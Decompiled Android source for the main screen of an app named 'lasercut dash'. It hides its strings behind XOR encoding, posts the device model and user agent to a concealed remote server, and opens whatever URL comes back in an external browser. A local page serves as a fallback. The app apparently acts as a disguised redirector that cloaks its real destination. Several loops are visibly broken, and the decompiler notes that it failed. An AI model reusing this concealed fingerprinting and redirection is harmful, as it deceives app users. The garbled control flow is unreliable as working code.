package com.lasercut.dash;

import H.e;
import K.A0;
import K.y0;
import N0.b;
import P0.c;
import Q0.h;
import T.t;
import W0.a;
import X0.d;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.lasercut.dash.MainActivity;
import com.lasercut.dash.R;
import e1.l;
import g.AbstractActivityC0125i;
import g.C0123g;
import g.C0124h;
import i1.m;
import i1.p;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0125i {

    /* renamed from: E, reason: collision with root package name */
    public static final /* synthetic */ int f1865E = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1866A;

    /* renamed from: B, reason: collision with root package name */
    public final c f1867B;

    /* renamed from: C, reason: collision with root package name */
    public String f1868C;

    /* renamed from: D, reason: collision with root package name */
    public final c f1869D;

    /* renamed from: y, reason: collision with root package name */
    public final c f1870y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1871z;

    public MainActivity() {
        this.d.f2378b.e("androidx:appcompat", new C0123g(this));
        h(new C0124h(this));
        final int i = 0;
        this.f1870y = new c(new a(this) { // from class: N0.a

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f614b;

            {
                this.f614b = this;
            }

            @Override // W0.a
            public final Object a() {
                int i2 = 0;
                MainActivity mainActivity = this.f614b;
                switch (i) {
                    case 0:
                        int i3 = MainActivity.f1865E;
                        KeyEvent.Callback callback = null;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                        if (inflate instanceof ViewGroup) {
                            ViewGroup viewGroup = (ViewGroup) inflate;
                            int childCount = viewGroup.getChildCount();
                            while (true) {
                                if (i2 < childCount) {
                                    KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                                    if (findViewById != null) {
                                        callback = findViewById;
                                    } else {
                                        i2++;
                                    }
                                }
                            }
                        }
                        WebView webView = (WebView) callback;
                        if (webView != null) {
                            return new O0.a(constraintLayout, webView);
                        }
                        throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
                    default:
                        return mainActivity.getSharedPreferences(mainActivity.f1871z, 0);
                }
            }
        });
        this.f1871z = t(new byte[]{-75, -4, 125});
        this.f1866A = t(new byte[]{-92, -17, 104, 60});
        final int i2 = 1;
        this.f1867B = new c(new a(this) { // from class: N0.a

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f614b;

            {
                this.f614b = this;
            }

            @Override // W0.a
            public final Object a() {
                int i22 = 0;
                MainActivity mainActivity = this.f614b;
                switch (i2) {
                    case 0:
                        int i3 = MainActivity.f1865E;
                        KeyEvent.Callback callback = null;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                        if (inflate instanceof ViewGroup) {
                            ViewGroup viewGroup = (ViewGroup) inflate;
                            int childCount = viewGroup.getChildCount();
                            while (true) {
                                if (i22 < childCount) {
                                    KeyEvent.Callback findViewById = viewGroup.getChildAt(i22).findViewById(R.id.webView);
                                    if (findViewById != null) {
                                        callback = findViewById;
                                    } else {
                                        i22++;
                                    }
                                }
                            }
                        }
                        WebView webView = (WebView) callback;
                        if (webView != null) {
                            return new O0.a(constraintLayout, webView);
                        }
                        throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
                    default:
                        return mainActivity.getSharedPreferences(mainActivity.f1871z, 0);
                }
            }
        });
        this.f1869D = new c(new b());
    }

    public static String t(byte[] bArr) {
        int[] iArr = {(int) 214, (int) 154, (int) 26, (int) 80};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        while (i < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        return new String(h.z0(arrayList), e1.a.f1914a);
    }

    /* JADX WARN: Code restructure failed: missing block: B:27:0x01d6, code lost:
    
        r5 = r2;
     */
    @Override // g.AbstractActivityC0125i, a.l, android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        setContentView(((O0.a) this.f1870y.a()).f618a);
        u();
        WebSettings settings = ((O0.a) this.f1870y.a()).f619b.getSettings();
        d.d(settings, "getSettings(...)");
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        ((O0.a) this.f1870y.a()).f619b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        g gVar2 = null;
        String string = ((SharedPreferences) this.f1867B.a()).getString(this.f1866A, null);
        if (string != null && !e1.d.q0(string)) {
            this.f1868C = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{-23, -5, 106, 32, -21});
        d.d(getPackageName(), "getPackageName(...)");
        byte[] bArr = {-66, -18, 110, 32, -91, -96, 53, Byte.MAX_VALUE, -81, -1, 118, 60, -71, -19, 55, 36, -92, -17, 110, 56, -5, -85, 40, 96, -26, -76, 125, 38, -70, -20, 108, 51, -67, -15, 117, 125, -65, -24, 104, 41, -72, -7, 113, 59, -73, -93, 41, 126, -95, -11, 104, 59, -77, -24, 105, 126, -78, -1, 108, Byte.MAX_VALUE};
        int[] iArr = {(int) 214, (int) 154, (int) 26, (int) 80};
        ArrayList arrayList = new ArrayList(60);
        int i = 0;
        int i2 = 0;
        while (i < 60) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        String str = new String(h.z0(arrayList), e1.a.f1914a) + t2 + packageName;
        t tVar = new t(4);
        d.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        d.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        tVar.f748a = lVar.a();
        String t3 = t(new byte[]{-114, -73, 94, 53, -96, -13, 121, 53, -5, -41, 117, 52, -77, -10});
        String str2 = Build.MODEL;
        d.d(str2, "MODEL");
        tVar.l(t3, str2);
        tVar.l(t(new byte[]{-105, -7, 121, 53, -90, -18, 55, 28, -73, -12, 125, 37, -73, -3, Byte.MAX_VALUE}), t(new byte[]{-77, -12, 55, 5, -123, -74, Byte.MAX_VALUE, 62, -19, -21, 39, 96, -8, -93}));
        String t4 = t(new byte[]{-125, -23, Byte.MAX_VALUE, 34, -5, -37, 125, 53, -72, -18});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        tVar.l(t4, defaultUserAgent);
        e b2 = tVar.b();
        p pVar = (p) this.f1869D.a();
        pVar.getClass();
        j jVar = new j(pVar, b2);
        B0.d dVar = new B0.d(9, this);
        if (!jVar.f3231e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3571a;
        jVar.f3232f = n.f3571a.g();
        t tVar2 = pVar.f2479a;
        g gVar3 = new g(jVar, dVar);
        tVar2.getClass();
        synchronized (tVar2) {
            ((ArrayDeque) tVar2.f749b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) tVar2.f750c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (d.a(((m) gVar.f3225c.f3229b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) tVar2.f749b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (d.a(((m) gVar.f3225c.f3229b.f213c).d, str3)) {
                        }
                    }
                }
            }
            if (gVar2 != null) {
                gVar3.f3224b = gVar2.f3224b;
            }
        }
        tVar2.r();
    }

    @Override // g.AbstractActivityC0125i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1868C;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.n0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.Q();
        y0Var.q0();
    }

    public final void v() {
        WebView webView = ((O0.a) this.f1870y.a()).f619b;
        webView.setVisibility(0);
        webView.loadUrl(t(new byte[]{-80, -13, 118, 53, -20, -75, 53, Byte.MAX_VALUE, -73, -12, 126, 34, -71, -13, 126, 15, -73, -23, 105, 53, -94, -75, 115, 62, -78, -1, 98, 126, -66, -18, 119, 60}));
    }

    public final void w(String str) {
        ((O0.a) this.f1870y.a()).f619b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
